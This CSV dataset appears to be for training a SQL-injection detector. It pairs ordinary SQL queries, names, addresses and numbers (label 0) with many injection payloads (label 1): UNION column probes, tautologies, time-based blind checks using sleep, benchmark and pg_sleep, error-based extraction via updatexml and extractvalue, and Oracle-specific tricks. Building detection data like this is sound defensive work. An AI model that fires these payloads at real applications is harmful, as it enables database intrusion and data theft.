Sentence,Label,Processed_Sentence
SELECT physical FROM mix UNION ALL SELECT safety FROM frog ORDER BY prepare,0.0,select physical from mix union all select safety from frog order by prepare
"zoma, la",0.0,"zoma, la"
su6sc87u23r,0.0,su0sc0u0r
SELECT COUNT ( in ) FROM lovely,0.0,select count ( in ) from lovely
"-7868""   )    )    or 9323  =  9323#",1.0,"-0""   )    )    or 0  =  0#"
1' in boolean mode  )   and   (  3020  =  3020  )  *6703#,1.0,0' in boolean mode  )   and   (  0  =  0  )  *0#
guilas,0.0,guilas
SELECT * FROM alphabet WHERE Price NOT BETWEEN 10 AND 20,0.0,select * from alphabet where price not between 0 and 0
SELECT * FROM action WHERE breath = 'chicken',0.0,select * from action where breath = 'chicken'
"   SELECT Employees.white, COUNT ( Orders.beforeID )  AS lakeFROM    ( OrdersINNER JOIN herd ON Orders.whistleID  =  Employees.climbID ) ",0.0,"   select employees.white, count ( orders.beforeid )  as lakefrom    ( ordersinner join herd on orders.whistleid  =  employees.climbid ) "
"-4797' union all select 8223,8223,8223,8223,8223,8223,8223,8223#",1.0,"-0' union all select 0,0,0,0,0,0,0,0#"
"-1174"" union all select 4303,4303,4303,4303#",1.0,"-0"" union all select 0,0,0,0#"
"1%'  )   union all select null,null,null,null,null,null,null,null,null,null#",1.0,"0%'  )   union all select null,null,null,null,null,null,null,null,null,null#"
SELECT * FROM major WHERE city LIKE '%hour%',0.0,select * from major where city like '%hour%'
epps6,0.0,epps0
"  SELECT todayID AS ID, world AS scale FROM favorite",0.0,"  select todayid as id, world as scale from favorite"
SELECT TOP 3 * FROM hardly WHERE interior = 'cannot',0.0,select top 0 * from hardly where interior = 'cannot'
1'  )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  'lnte'  =  'lnte,1.0,0'  )   and 0  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||  (  select   (  case when   (  0  =  0  )   then 0 else 0 end  )   from dual  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0   )    )     )   and   (  'lnte'  =  'lnte
"1%""  )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""%""  =  """,1.0,"0%""  )   and 0 in    (    (   char  (  0  )  +char  (  0  )  +char  (  0  )  +char  (  0  )  +char  (  0  )  +  (  select   (  case when   (  0  =  0  )   then char  (  0  )   else char  (  0  )   end   )    )   +char  (  0  )  +char  (  0  )  +char  (  0  )  +char  (  0  )  +char  (  0   )    )     )   and   (  ""%""  =  """
DELETE FROM dust,0.0,delete from dust
"1  )   as pcnd where 4589  =  4589 union all select null,null,null,null,null,null,null,null,null,null--",1.0,"0  )   as pcnd where 0  =  0 union all select null,null,null,null,null,null,null,null,null,null--"
"  UPDATE paper SET became =  'grabbed', City =  'anybody' WHERE possible =  climate",0.0,"  update paper set became =  'grabbed', city =  'anybody' where possible =  climate"
SELECT AVG ( locate )  FROM pilot  SELECT SUM ( practice ) ,0.0,select avg ( locate )  from pilot  select sum ( practice ) 
" SELECT * FROM coming ORDER BY curve ASC, bigger DESC",0.0," select * from coming order by curve asc, bigger desc"
"c/ juan carlos onetti 4, 1?d",0.0,"c/ juan carlos onetti 0, 0?d"
SELECT * FROM butter WHERE spent = 'want'  OR court = 'very',0.0,select * from butter where spent = 'want'  or court = 'very'
or,1.0,or
1%'  )   and 9198  =  9198--,1.0,0%'  )   and 0  =  0--
43814,0.0,0
leigh_hellinger@atorre.sy,0.0,leigh_hellinger@atorre.sy
SELECT TOP 50 PERCENT * FROM influence,0.0,select top 0 percent * from influence
16824275m,0.0,0m
"1""   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  ""djwo""  =  ""djwo",1.0,"0""   )    )     )   or   (  select * from   (  select  (  sleep  (  0   )    )     )  ydpu  )   and    (    (     (  ""djwo""  =  ""djwo"
select   (  case when   (  9556  =  7122  )   then 9556 else 9556*  (  select 9556 from information_schema.character_sets  )   end  )  #,1.0,select   (  case when   (  0  =  0  )   then 0 else 0*  (  select 0 from information_schema.character_sets  )   end  )  #
select case when 7649  =  9297 then 1 else null end--,1.0,select case when 0  =  0 then 0 else null end--
4417,0.0,0
SELECT * FROM triangle FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM anybody,0.0,select * from triangle fetch first 0 rows only select top 0 percent * from anybody
"-2643%"" union all select 7779,7779--",1.0,"-0%"" union all select 0,0--"
SELECT * FROM thus,0.0,select * from thus
SELECT MIN ( sea )  AS hurt FROM silence,0.0,select min ( sea )  as hurt from silence
SELECT * FROM hearing WHERE Price NOT BETWEEN 10 AND 20,0.0,select * from hearing where price not between 0 and 0
nolay,0.0,nolay
"1 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  ",1.0,"0 and 0  =    (  select count  (  *  )   from rdb$fields as t0,rdb$types as t0,rdb$collations as t0,rdb$functions as t0  )  "
"  SELECT * FROM garage WHERE exactly IN  ( 'above', 'shut', 'becoming' )  ",0.0,"  select * from garage where exactly in  ( 'above', 'shut', 'becoming' )  "
SELECT picture FROM vowel UNION SELECT plus FROM necessary ORDER BY coming,0.0,select picture from vowel union select plus from necessary order by coming
"-1072%""   )    )    or 3090  =  3539",1.0,"-0%""   )    )    or 0  =  0"
leobaldo,0.0,leobaldo
SELECT * FROM tiny ORDER BY eat DESC,0.0,select * from tiny order by eat desc
SELECT * FROM private WHERE mental IN  ( SELECT thousand FROM silence ) ,0.0,select * from private where mental in  ( select thousand from silence ) 
"1%'   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1.0,"0%'   )    )    or 0  =  benchmark  (  0,md0  (  0x0d0a0c   )    )   #"
9043,0.0,0
"SELECT CustomerName, /*City,*/ Country FROM Customers;",0.0,"select customername, /*city,*/ country from customers;"
5255020000000000,0.0,0
o.donnel,0.0,o.donnel
DELETE FROM ear WHERE ran = 'ball',0.0,delete from ear where ran = 'ball'
"1'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   'pbtf'  =  'pbtf",1.0,"0'   )    )    and row  (  0,0  )  >  (  select count  (  *  )  ,concat  (  0x0a0,  (  select   (  elt  (  0  =  0,0   )    )     )  ,0x0a0a0,floor  (  rand  (  0  )  *0   )    )   x from   (  select 0 union select 0 union select 0 union select 0  )  a group by x  )   and    (    (   'pbtf'  =  'pbtf"
"1%"" union all select null--",1.0,"0%"" union all select null--"
haker-durango@mirallesmoscardo.ro,0.0,haker-durango@mirallesmoscardo.ro
banerjee6@getgold.ec,0.0,banerjee0@getgold.ec
"1""  )   where 9680  =  9680 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1.0,"0""  )   where 0  =  0 and   (  select 0*  (  if   (    (   select * from   (  select concat  (  0x0a0,  (  select   (  elt  (  0  =  0,0   )    )     )  ,0x0a0a0,0x0   )    )   s  )  , 0, 0   )    )     )  --"
1'||  (  select 'fjlg' from dual where 9517  =  9517,1.0,0'||  (  select 'fjlg' from dual where 0  =  0
"1 where 8333  =  8333 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1.0,"0 where 0  =  0 and 0  =  ctxsys.drithsx.sn  (  0,  (  chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||  (  select   (  case when   (  0  =  0  )   then 0 else 0 end  )   from dual  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0   )    )     )  --"
-9644   )    )    or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   5616  =  5616,1.0,-0   )    )    or 0  =    (  select upper  (  xmltype  (  chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||  (  select   (  case when   (  0  =  0  )   then 0 else 0 end  )   from dual  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0   )    )     )   from dual  )   and    (    (   0  =  0
"  SELECT placeID AS ID, fix AS held FROM early",0.0,"  select placeid as id, fix as held from early"
"-5744  )   union all select 3617,3617,3617,3617,3617,3617--",1.0,"-0  )   union all select 0,0,0,0,0,0--"
21208,0.0,0
SELECT press FROM bear UNION ALL SELECT finger FROM one ORDER BY central,0.0,select press from bear union all select finger from one order by central
SELECT * FROM strike FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM breathe,0.0,select * from strike fetch first 0 rows only select top 0 percent * from breathe
"   SELECT COUNT ( trip ) , apart FROM fish BY rain",0.0,"   select count ( trip ) , apart from fish by rain"
"   SELECT rubber, difficulty, teethFROM dried WHERE magic  IS NOT NULL",0.0,"   select rubber, difficulty, teethfrom dried where magic  is not null"
SELECT * FROM  ( SELECT zebra FROM does ) ,0.0,select * from  ( select zebra from does ) 
SELECT * FROM anywhere WHERE NOT mountain = 'aboard'  AND NOT motion = 'moment',0.0,select * from anywhere where not mountain = 'aboard'  and not motion = 'moment'
4815640000000000,0.0,0
"1',  (  select * from generate_series  (  5609,5609,case when   (  5609  =  5609  )   then 1 else 0 end  )   limit 1  )  ",1.0,"0',  (  select * from generate_series  (  0,0,case when   (  0  =  0  )   then 0 else 0 end  )   limit 0  )  "
ortuella,0.0,ortuella
SELECT * FROM pain WHERE stay BETWEEN '1996-07-01' AND '1996-07-31',0.0,select * from pain where stay between '0-0-0' and '0-0-0'
chuck,0.0,chuck
5259660000000000,0.0,0
SELECT * FROM sudden WHERE bill IN  ( SELECT spend FROM something ) ,0.0,select * from sudden where bill in  ( select spend from something ) 
63829565b,0.0,0b
SELECT * FROM local WHERE    NOT winter = 'region',0.0,select * from local where    not winter = 'region'
tornadizos de vila,0.0,tornadizos de vila
"1""   )    )    as wugz where 5355  =  5355 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",1.0,"0""   )    )    as wugz where 0  =  0 and 0  =  benchmark  (  0,md0  (  0x0   )    )   --"
3641,0.0,0
"1""   )    )    and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   ""kldp"" like ""kldp",1.0,"0""   )    )    and 0  =    (  select count  (  *  )   from rdb$fields as t0,rdb$types as t0,rdb$collations as t0,rdb$functions as t0  )   and    (    (   ""kldp"" like ""kldp"
SELECT AVG ( package ) FROM queen SELECT SUM ( ran ) ,0.0,select avg ( package ) from queen select sum ( ran ) 
"1  )   where 1559  =  1559 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --",1.0,"0  )   where 0  =  0 or updatexml  (  0,concat  (  0x0e,0x0a0,  (  select   (  elt  (  0  =  0,0   )    )     )  ,0x0a0a0  )  ,0  )  --"
"1""   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  ""tiet"" like ""tiet",1.0,"0""   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x0a0,  (  select   (  elt  (  0  =  0,0   )    )     )  ,0x0a0a0,0x0   )    )   x   )    )    and    (    (     (  ""tiet"" like ""tiet"
SELECT * FROM recognize WHERE total = 'double'  AND  ( than = 'flow' OR tribe = 'beginning' ) ,0.0,select * from recognize where total = 'double'  and  ( than = 'flow' or tribe = 'beginning' ) 
sashya,0.0,sashya
SELECT * FROM cap WHERE mighty BETWEEN 'coat' AND 'plural',0.0,select * from cap where mighty between 'coat' and 'plural'
"1"" where 7249  =  7249 union all select null,null,null,null,null,null,null,null,null,null--",1.0,"0"" where 0  =  0 union all select null,null,null,null,null,null,null,null,null,null--"
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  7711  =  7711",1.0,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  0/0   )    )      )    )    and   (  0  =  0"
"1'  )   as ssez where 5351  =  5351 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1.0,"0'  )   as ssez where 0  =  0 or char  (  0  )  ||char  (  0  )  ||char  (  0  )  ||char  (  0  )    =  regexp_substring  (  repeat  (  right  (  char  (  0  )  ,0  )  ,0  )  ,null  )  --"
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and   (  'ztmd'  =  'ztmd",1.0,"select dbms_pipe.receive_message  (  chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ,0  )   from dual and   (  'ztmd'  =  'ztmd"
1   )    )     )   union all select null--,1.0,0   )    )     )   union all select null--
"1 or elt  (  6272  =  6272,sleep  (  5   )    )   -- ilfc",1.0,"0 or elt  (  0  =  0,sleep  (  0   )    )   -- ilfc"
SELECT AVG ( balloon ) FROM pain SELECT SUM ( negative ) ,0.0,select avg ( balloon ) from pain select sum ( negative ) 
1  )   as nsdy where 7513  =  7513,1.0,0  )   as nsdy where 0  =  0
1  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1.0,0  )   or 0  =    (  select 0 from pg_sleep  (  0   )    )   --
braddell@cincocolores.cat,0.0,braddell@cincocolores.cat
select   (  case when   (  8208  =  7960  )   then 8208 else 8208*  (  select 8208 from information_schema.character_sets  )   end  )  #,1.0,select   (  case when   (  0  =  0  )   then 0 else 0*  (  select 0 from information_schema.character_sets  )   end  )  #
353283000000000,0.0,0
"1   )    )    as queb where 2449  =  2449 union all select null,null#",1.0,"0   )    )    as queb where 0  =  0 union all select null,null#"
-3998'   )    )    or 3038  =  3038,1.0,-0'   )    )    or 0  =  0
6015,0.0,0
lor81a5o,0.0,lor0a0o
FROM  ( SELECT DISTINCT built FROM calm ) ,0.0,from  ( select distinct built from calm ) 
1 where 6434  =  6434,1.0,0 where 0  =  0
-8701%'   )    )    or   (  4843  =  1690  )  *1690 and    (    (   '%'  =  ',1.0,-0%'   )    )    or   (  0  =  0  )  *0 and    (    (   '%'  =  '
SELECT * FROM person ORDER BY necessary DESC,0.0,select * from person order by necessary desc
SELECT bigger ( s )  FROM mighty UNION ALL,0.0,select bigger ( s )  from mighty union all
-3596   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  3645  =  3645,1.0,-0   )    )     )   or 0  =    (  'qqpjq'||  (  select case 0 when 0 then 0 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  0  =  0
SELECT wp_posts.* FROM wp_posts WHERE ID IN  ( 367660 ) ,0.0,select wp_posts.* from wp_posts where id in  ( 0 ) 
"-1597"" union all select 6038,6038,6038,6038,6038,6038,6038,6038,6038,6038--",1.0,"-0"" union all select 0,0,0,0,0,0,0,0,0,0--"
SELECT * FROM case ORDER BY somebody DESC,0.0,select * from case order by somebody desc
31271,0.0,0
"1' or elt  (  6272  =  6272,sleep  (  5   )    )    and 'wdoi'  =  'wdoi",1.0,"0' or elt  (  0  =  0,sleep  (  0   )    )    and 'wdoi'  =  'wdoi"
SELECT AVG ( start )  FROM compass  SELECT SUM ( traffic ) ,0.0,select avg ( start )  from compass  select sum ( traffic ) 
57317186j,0.0,0j
1   )    )    and 3249  =  2985,1.0,0   )    )    and 0  =  0
"-6041'   )    )    or make_set  (  9835  =  1367,1367  )   and    (    (   'hxjf'  =  'hxjf",1.0,"-0'   )    )    or make_set  (  0  =  0,0  )   and    (    (   'hxjf'  =  'hxjf"
SELECT * FROM hung WHERE already = 'greatest'  AND  ( sun = 'ahead' OR characteristic = 'one' ) ,0.0,select * from hung where already = 'greatest'  and  ( sun = 'ahead' or characteristic = 'one' ) 
1 and 8398  =  1891-- naov,1.0,0 and 0  =  0-- naov
"1 where 7158  =  7158 or elt  (  5873  =  5873,sleep  (  5   )    )   #",1.0,"0 where 0  =  0 or elt  (  0  =  0,sleep  (  0   )    )   #"
SELECT * FROM floating WHERE magic NOT BETWEEN 'worse' AND 'conversation',0.0,select * from floating where magic not between 'worse' and 'conversation'
9.03287E+015,0.0,0.0e+0
SELECT * FROM dog 3 SELECT * FROM gave,0.0,select * from dog 0 select * from gave
"  SELECT ADDTIME ( ""2017-06-15   09:34:21.000001"", ""5.000003"" ) ;",0.0,"  select addtime ( ""0-0-0   0:0:0.0"", ""0.0"" ) ;"
"-5190%"" or 8298  =  9306 and ""%""  =  """,1.0,"-0%"" or 0  =  0 and ""%""  =  """
danis,0.0,danis
"-6496""   )    )     )   or 1471  =  5278 and    (    (     (  ""zkoj""  =  ""zkoj",1.0,"-0""   )    )     )   or 0  =  0 and    (    (     (  ""zkoj""  =  ""zkoj"
SELECT DISTINCT spoken FROM tribe,0.0,select distinct spoken from tribe
SELECT * FROM baby WHERE cast NOT LIKE 'twenty%',0.0,select * from baby where cast not like 'twenty%'
arcos de jaln,0.0,arcos de jaln
1' rlike   (  select   (  case when   (  1916  =  7874  )   then 1 else 0x28 end   )    )    and 'ughq'  =  'ughq,1.0,0' rlike   (  select   (  case when   (  0  =  0  )   then 0 else 0x0 end   )    )    and 'ughq'  =  'ughq
"   SELECT pocket, birds, moneyFROM observe WHERE smoke  IS NOT NULL",0.0,"   select pocket, birds, moneyfrom observe where smoke  is not null"
" SELECT column_name ( s )  FROM west,center",0.0," select column_name ( s )  from west,center"
SELECT wp_posts.* FROM wp_posts WHERE 1 = 1 AND wp_posts.ID  =  27990 AND wp_posts.post_type  =  'page' ORDER BY wp_posts.post_date DESC,0.0,select wp_posts.* from wp_posts where 0 = 0 and wp_posts.id  =  0 and wp_posts.post_type  =  'page' order by wp_posts.post_date desc
2018710000000000,0.0,0
"-6642'  )   where 3459  =  3459 union all select 3459,3459,3459,3459,3459,3459,3459,3459,3459#",1.0,"-0'  )   where 0  =  0 union all select 0,0,0,0,0,0,0,0,0#"
"  SELECT DATEDIFF ( ""2017-06-25 09:34:21"", ""2017-06-15 15:25:35"" ) ;",0.0,"  select datediff ( ""0-0-0 0:0:0"", ""0-0-0 0:0:0"" ) ;"
SELECT * FROM bet WHERE NOT mean = 'organization'  AND NOT condition = 'cutting',0.0,select * from bet where not mean = 'organization'  and not condition = 'cutting'
""" or """"-""",1.0,""" or """"-"""
""" or true--",1.0,""" or true--"
1800000000000000,0.0,0
49830,0.0,0
select * from users where id  =  1 or \<   =  1 or 1  =  1 -- 1,1.0,select * from users where id  =  0 or \<   =  0 or 0  =  0 -- 0
"1' where 9605  =  9605 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",1.0,"0' where 0  =  0 procedure analyse  (  extractvalue  (  0,concat  (  0x0c,0x0a0,  (  select   (  case when   (  0  =  0  )   then 0 else 0 end   )    )   ,0x0a0a0   )    )   ,0  )  --"
boyadgian@campanasextractoras.tv,0.0,boyadgian@campanasextractoras.tv
SELECT spring ( s )  FROM salmon LEFT JOIN,0.0,select spring ( s )  from salmon left join
"1'  )   as afnt where 4719  =  4719 and elt  (  8224  =  1275,1275  )  --",1.0,"0'  )   as afnt where 0  =  0 and elt  (  0  =  0,0  )  --"
kimbroug,0.0,kimbroug
"  UPDATE won SET known =  'prepare', City =  'far' WHERE dust =  terrible",0.0,"  update won set known =  'prepare', city =  'far' where dust =  terrible"
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 8774 )  ORDER BY meta_id ASC",0.0,"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 0 )  order by meta_id asc"
 or user like '%,1.0, or user like '%
SELECT * FROM population ORDER BY development DESC,0.0,select * from population order by development desc
"-5616""   )    )     )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  ""hdrb"" like ""hdrb",1.0,"-0""   )    )     )   or 0  =  convert  (  int,  (  select char  (  0  )  +char  (  0  )  +char  (  0  )  +char  (  0  )  +char  (  0  )  +  (  select   (  case when   (  0  =  0  )   then char  (  0  )   else char  (  0  )   end   )    )   +char  (  0  )  +char  (  0  )  +char  (  0  )  +char  (  0  )  +char  (  0   )    )     )   and    (    (     (  ""hdrb"" like ""hdrb"
smoot,0.0,smoot
SELECT AVG ( gentle ) FROM continued SELECT SUM ( cry ) ,0.0,select avg ( gentle ) from continued select sum ( cry ) 
"-8544%"" or 6872  =  6872 and ""%""  =  """,1.0,"-0%"" or 0  =  0 and ""%""  =  """
 UPDATE diagram SET ranch = 'its'WHERE statement = 'try',0.0, update diagram set ranch = 'its'where statement = 'try'
"SELECT * FROM train WHERE with BETWEEN ""dull"" AND    ""period""",0.0,"select * from train where with between ""dull"" and    ""period"""
-9653'  )   where 2705  =  2705 or 9323  =  9323#,1.0,-0'  )   where 0  =  0 or 0  =  0#
"  SELECT * FROM egg WHERE express IN  ( 'correctly', 'fur', 'car' )  ",0.0,"  select * from egg where express in  ( 'correctly', 'fur', 'car' )  "
vargueo,0.0,vargueo
"SELECT * FROM rule WHERE balance BETWEEN ""plastic"" AND    ""whatever""",0.0,"select * from rule where balance between ""plastic"" and    ""whatever"""
santamarina,0.0,santamarina
a3ui11d,0.0,a0ui0d
password:*/  =  1--,1.0,password:*/  =  0--
"1%""   )    )     )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1.0,"0%""   )    )     )   or 0  =  dbms_pipe.receive_message  (  chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ,0  )  --"
1'   )    )    as hxxm where 3792  =  3792 and sleep  (  5  )  #,1.0,0'   )    )    as hxxm where 0  =  0 and sleep  (  0  )  #
SELECT doing ( s )  FROM largest,0.0,select doing ( s )  from largest
"1""  )   as lrew where 6067  =  6067 union all select null,null,null,null,null,null,null#",1.0,"0""  )   as lrew where 0  =  0 union all select null,null,null,null,null,null,null#"
"   SELECT mind,numeral,than,exclaimed,known     (  (  guide JOIN coast ON snake.well =  magic.snake )   INNER JOIN entireON Orders.observe =  underline.viewID ) ",0.0,"   select mind,numeral,than,exclaimed,known     (  (  guide join coast on snake.well =  magic.snake )   inner join entireon orders.observe =  underline.viewid ) "
"1'  )   as zxho where 5907  =  5907 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1.0,"0'  )   as zxho where 0  =  0 or 0  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  0/0   )    )      )    )   --"
"1'   )    )    and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1.0,"0'   )    )    and 0  =    (  select count  (  *  )   from sysusers as sys0,sysusers as sys0,sysusers as sys0,sysusers as sys0,sysusers as sys0,sysusers as sys0,sysusers as sys0  )  --"
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 7064 )  ORDER BY meta_id ASC",0.0,"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 0 )  order by meta_id asc"
37210,0.0,0
trebaol@arroyomolinos-madrid.gq,0.0,trebaol@arroyomolinos-madrid.gq
" select * from users where id  =  1 +  (  1  )   union select null,banner from v$version where rownum  =  1 -- 1",1.0," select * from users where id  =  0 +  (  0  )   union select null,banner from v$version where rownum  =  0 -- 0"
alberite de san juan,0.0,alberite de san juan
"1"" rlike   (  select   (  case when   (  3711  =  3313  )   then 1 else 0x28 end   )    )    and ""iqlh"" like ""iqlh",1.0,"0"" rlike   (  select   (  case when   (  0  =  0  )   then 0 else 0x0 end   )    )    and ""iqlh"" like ""iqlh"
michell4@so-tel.jobs,0.0,michell0@so-tel.jobs
"1""   )    )    as tngu where 3644  =  3644 union all select null--",1.0,"0""   )    )    as tngu where 0  =  0 union all select null--"
"1"" union all select null,null#",1.0,"0"" union all select null,null#"
ajaraca,0.0,ajaraca
SELECT * FROM below WHERE tonight = 'sick'  AND  ( year = 'labor' OR she = 'too' ) ,0.0,select * from below where tonight = 'sick'  and  ( year = 'labor' or she = 'too' ) 
"calle salvador de madariaga s/n,",0.0,"calle salvador de madariaga s/n,"
-3598  )   union all select 2264#,1.0,-0  )   union all select 0#
"   SELECT dress, title+ ', ' + dish+ ' ' + seed+ ', ' + dog AS pipe  FROM frighten",0.0,"   select dress, title+ ', ' + dish+ ' ' + seed+ ', ' + dog as pipe  from frighten"
"c/ hermenegilda portillo, 70",0.0,"c/ hermenegilda portillo, 0"
kallewar,0.0,kallewar
SELECT * FROM clay WHERE shallow IN  ( SELECT enough FROM flag ) ,0.0,select * from clay where shallow in  ( select enough from flag ) 
"  SELECT splitID AS ID, shorter AS he FROM list",0.0,"  select splitid as id, shorter as he from list"
"1%""   )    )    and elt  (  7633  =  4110,4110  )   and    (    (   ""%""  =  """,1.0,"0%""   )    )    and elt  (  0  =  0,0  )   and    (    (   ""%""  =  """
-1354   )    )    or 8571  =  8571--,1.0,-0   )    )    or 0  =  0--
SELECT * FROM nearly WHERE    NOT find = 'add',0.0,select * from nearly where    not find = 'add'
"1'  )   as eany where 3169  =  3169 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1.0,"0'  )   as eany where 0  =  0 and 0  =    (  select count  (  *  )   from rdb$fields as t0,rdb$types as t0,rdb$collations as t0,rdb$functions as t0  )  --"
